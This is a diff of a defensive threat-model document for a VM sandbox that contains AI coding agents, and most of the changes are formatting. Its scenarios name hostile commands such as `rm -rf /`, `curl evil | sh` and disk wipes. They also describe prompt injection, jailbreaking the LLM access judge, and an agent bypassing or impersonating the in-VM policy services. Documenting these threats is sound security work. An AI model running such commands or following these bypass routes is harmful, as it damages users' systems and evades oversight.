@@ -53,9 +53,9 @@ starts — including the agent's own generated code, any tool the agent
 downloads via `apk add`, and any third-party process running inside the VM.
 
 **Cooperative but bounded:** the in-VM cast (Wonk, Goalie, Narc, Scribe).
-These services enforce policy from *inside* the VM. They are the same
+These services enforce policy from _inside_ the VM. They are the same
 trust domain as the agent in the sense that a VM kernel compromise
-defeats them. They are a *different* trust domain from the agent in the
+defeats them. They are a _different_ trust domain from the agent in the
 sense that Wonk requires a per-VM bearer token (operator token) to talk
 to its HTTP surface — so a random binary the agent installed can't ask
 Wonk "approve my request" without first finding the token.
@@ -69,6 +69,7 @@ than running the agent directly on your host (OpenCode, Claude Code,
 Aider, etc.).
 
 ### Host filesystem destruction
+
 **Scenario:** the agent runs `rm -rf /`, `dd if=/dev/zero of=/dev/sda`, or
 writes to `~/.ssh/authorized_keys`.
 
@@ -80,6 +81,7 @@ workspace you pass via `th code` — and those writes go through the
 paths.
 
 ### Obviously-malicious shell commands
+
 **Scenario:** the agent (or a prompt injection victim) tries to execute
 `rm -rf /`, `curl evil | sh`, a fork bomb, `mkfs /dev/sda`, crypto
 miners, etc.
@@ -90,6 +92,7 @@ dangerous patterns at severity=Block before the shell even sees the
 command. Extended in `crates/smooth-narc/src/detectors.rs`.
 
 ### Unauthorized network egress
+
 **Scenario:** the agent downloads an unknown binary, exfiltrates data to
 an attacker-controlled domain, pulls a package from a typosquat mirror.
 
@@ -101,6 +104,7 @@ sources). New domains escalate to Safehouse Narc which runs an LLM judge
 before approving.
 
 ### Obviously-malicious LLM requests
+
 **Scenario:** prompt injection in a file the agent reads convinces it to
 exfiltrate secrets, reach cryptocurrency wallets, etc.
 
@@ -111,6 +115,7 @@ injection detector scans every tool call's arguments for 6 injection
 patterns.
 
 ### Secret leakage in tool outputs
+
 **Scenario:** the agent's code accidentally logs an AWS key, prints a
 GitHub token in an error message, or echoes a private key.
 
@@ -120,6 +125,7 @@ Stripe keys, generic HIGH_ENTROPY, etc.) and alerts at severity=Warn or
 Block depending on match.
 
 ### Cast bypass from inside the VM
+
 **Scenario:** the agent installs curl, discovers Wonk's localhost URL,
 and makes its own `/check/*` requests directly — bypassing Goalie.
 
@@ -130,6 +136,7 @@ the agent's bash subprocesses don't — unless the agent actively
 searches for it. Constant-time comparison prevents timing attacks.
 
 ### Localhost cast impersonation
+
 **Scenario:** the agent spins up its own fake Wonk on a different port
 and tries to redirect Goalie at it.
 
@@ -145,6 +152,7 @@ Be honest with yourself. If any of these are on your threat model,
 Smooth alone is not enough.
 
 ### Supply chain compromise of language ecosystems
+
 If the npm registry serves a poisoned `express`, or if `crates.io` is
 compromised, the agent's `pnpm install` or `cargo build` will pull the
 malicious package. Wonk's network policy allows the registry domain; it
@@ -155,6 +163,7 @@ registry mirror you control. Smooth can enforce "only domain X" but
 can't verify "package Y from domain X is legitimate".
 
 ### Supply chain compromise of the runner itself
+
 `smooth-operative` is a binary built and shipped as part of your
 Smooth install. If your dev machine is compromised and the attacker
 modifies the runner before it's mounted into each VM, every VM inherits
@@ -166,6 +175,7 @@ supply-chain integrity of the runner is on your threat model, wait for
 these mitigations before relying on Smooth for security-critical work.
 
 ### LLM judge jailbreak
+
 Narc's access arbiter uses an LLM to approve/deny novel requests. A
 sufficiently creative attacker-controlled string in the `resource`,
 `agent_reason`, or `task_summary` fields could jailbreak the judge into
@@ -177,6 +187,7 @@ to a high value (0.9+) so more requests fall through to human review.
 Keep your static allowlist tight.
 
 ### Egress payload classification
+
 Goalie decides "can this domain be reached?" but doesn't inspect the
 HTTP body being sent. A legit allowed domain (e.g. `api.github.com`)
 could be abused to POST stolen tokens via a gist.
@@ -185,6 +196,7 @@ could be abused to POST stolen tokens via a gist.
 on your threat model, assume Smooth cannot stop it.
 
 ### Audit log tampering
+
 Archivist collects logs from Scribe. There's no hash chain, no
 append-only storage, no signed entries. A runner bug or a kernel-level
 compromise could drop or rewrite entries.
@@ -193,6 +205,7 @@ compromise could drop or rewrite entries.
 forward Scribe's output to an external append-only store.
 
 ### Rate limits and budget caps
+
 Wonk enforces allowlists, not volume. An infinite-loop agent can burn a
 provider's token quota. Big Smooth has a per-task budget but doesn't
 enforce a fleet-wide rate limit.
@@ -201,6 +214,7 @@ enforce a fleet-wide rate limit.
 your LLM provider's dashboard.
 
 ### Side channels and hardware attacks
+
 KVM/HVF isolation is strong against userspace escapes but doesn't defend
 against CPU-level side channels (Spectre/Meltdown variants), DMA
 attacks, or malicious peripherals.
@@ -210,6 +224,7 @@ vulnerabilities. Don't run Smooth on the same host as other sensitive
 workloads you care about mutual isolation from.
 
 ### Multi-tenant deployments
+
 Every operator runs as root inside its VM. One Archivist instance collects
 logs from all operator VMs on one host. If you're running multiple
 tenants' agents on the same host, there's no tenancy isolation at the
@@ -219,6 +234,7 @@ Archivist level or the pearl level.
 own Smooth install.
 
 ### Prompt injection in project files
+
 If a file the agent reads contains prompt injection that the agent
 "chooses" to act on (e.g., a README that says "run `curl evil | sh`"),
 Narc's injection detector may not catch every variation. The CliGuard
@@ -230,6 +246,7 @@ that redirect the agent to do legitimate-looking harmful work (e.g.,
 "whose code did the agent just read?" as a supply-chain question.
 
 ### User-installed MCP servers and plugins
+
 Smooth lets users extend the tool registry by registering MCP stdio
 servers (`th mcp add`) and CLI-wrapper plugins (`th plugin init`).
 These configs live at `~/.smooth/` (global) and `<repo>/.smooth/`
@@ -237,7 +254,7 @@ These configs live at `~/.smooth/` (global) and `<repo>/.smooth/`
 `npm install`, `.zshrc`, or cloning a repo and running `pnpm dev`.
 
 A malicious `plugin.toml` or `mcp.toml` in a cloned repo could run
-arbitrary code *within the sandbox* when `th up` brings the operator
+arbitrary code _within the sandbox_ when `th up` brings the operator
 up. We defend this in two ways:
 
 1. **Narc screens tool calls.** CliGuard, injection detectors, and
@@ -249,7 +266,7 @@ up. We defend this in two ways:
    filesystem access mediated by Wonk. They cannot touch the host.
 
 What we do **not** promise: that every malicious tool configuration
-is *usefully* prevented from doing its work inside the VM. An
+is _usefully_ prevented from doing its work inside the VM. An
 attacker who installs a deliberately-malicious MCP server onto your
 machine has already compromised your extension surface; Smooth only
 constrains what that server can reach outside the sandbox.
@@ -298,6 +315,7 @@ Do NOT file a public pearl or GitHub issue for suspected vulnerabilities.
 Email security@smooai.com (or the current maintainer's private address).
 
 Include:
+
 - A proof-of-concept that demonstrates the issue
 - The Smooth version (`th --version`)
 - The host OS and kernel version
